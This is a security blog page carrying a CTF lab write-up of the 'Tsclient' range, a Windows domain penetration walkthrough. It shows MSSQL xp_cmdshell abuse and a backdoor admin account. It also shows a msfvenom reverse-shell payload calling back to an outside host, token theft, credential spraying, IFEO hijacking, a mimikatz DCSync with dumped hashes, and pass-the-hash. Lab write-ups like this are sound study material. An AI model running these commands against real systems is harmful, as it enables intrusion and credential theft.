<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>春秋云镜-Tsclient-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, 渗透, 春秋云镜">
<meta name="description" content="Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3fcf74ad9d359e0c6c3d2b51a42f684a692fd9cd053c3829756ad5f3e4c4649b.css" integrity="sha256-P890rZ01ngxsPStRpC9oSmkv2c0FPDgpdWrV8&#43;TEZJs=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="春秋云镜-Tsclient-Writeup">
  <meta property="og:description" content="Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-03-12T22:03:55+08:00">
    <meta property="article:modified_time" content="2025-03-12T22:03:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="渗透">
    <meta property="article:tag" content="春秋云镜">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="春秋云镜-Tsclient-Writeup">
<meta name="twitter:description" content="Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "春秋云镜-Tsclient-Writeup",
      "item": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "春秋云镜-Tsclient-Writeup",
  "name": "春秋云镜-Tsclient-Writeup",
  "description": "Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n",
  "keywords": [
    "writeup", "渗透", "春秋云镜"
  ],
  "articleBody": "Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient – Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 存在\n那我们接下来启动它\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; 配置选项 'xp_cmdshell' 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell 'whoami' 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u003etype C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u003e IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u003e 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u003e [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u003e [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u003e Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u003e Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u003e Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u003e Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u003e 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u003e 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u003e 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u003e 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u003e [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u003e 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u003e 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u003e 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u003e 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u003e 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u003enet user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u003equser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u003enet user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u003enet localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u003eREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u003e use incognito 2Loading extension incognito...Success. 3meterpreter \u003e list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u003e impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u003e shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u003ewhoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u003etype \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p 'Ald@rLMWuy7Z!#' 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" exit \u003e mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u003e https://blog.gentilkiwi.com/mimikatz\r'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )\r'#####' \u003e https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] 'xiaorang.lab' will be the domain\r[DC] 'DC01.xiaorang.lab' will be the DC server\r[DC] Exporting domain 'xiaorang.lab'\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u003etype c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-'\r| | ( (`\\] / /'`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `'.'. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )'.___.'[___][___]'.__.'[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n",
  "wordCount" : "3480",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-03-12T22:03:55+08:00",
  "dateModified": "2025-03-12T22:03:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页📔</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档🗃️</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签🔖</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索🔎</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="友链🎈">
                    <span>友链🎈</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于👨‍💻</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      春秋云镜-Tsclient-Writeup
    </h1>
<div class="post-meta"><span title='2025-03-12 22:03:55 +0800 CST'>2025-03-12</span>&nbsp;·&nbsp;7 分钟&nbsp;·&nbsp;Xrntkk

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#flag1" aria-label="FLAG1">FLAG1</a></li>
                <li>
                    <a href="#flag2" aria-label="FLAG2">FLAG2</a></li>
                <li>
                    <a href="#flag3" aria-label="FLAG3">FLAG3</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。</p>
<blockquote>
<p>参考文章</p>
<p><a href="https://www.cnblogs.com/kingbridge/articles/17645128.html">春秋云镜 TSclient &ndash; Walkthrough - KingBridge - 博客园</a></p>
<p><a href="https://bowuchuling.github.io/posts/chunqiu_Tsclient">春秋云境 Tsclient | 初零·b10g~🥝</a></p></blockquote>
<h3 id="flag1">FLAG1<a hidden class="anchor" aria-hidden="true" href="#flag1">#</a></h3>
<p><img alt="image-20250309183544076" loading="lazy" src="../assets/image-20250309183544076.png"></p>
<p>先用fscan扫一下</p>
<p><img alt="image-20250309184512071" loading="lazy" src="../assets/image-20250309184512071.png">
mssql服务是弱口令</p>
<pre tabindex="0"><code>sa/1qaz!QAZ
</code></pre><p>用数据库管理工具连上去</p>
<p><img alt="image-20250309190358640" loading="lazy" src="../assets/image-20250309190358640.png"></p>
<p>接下来要看mssql怎么进行命令执行</p>
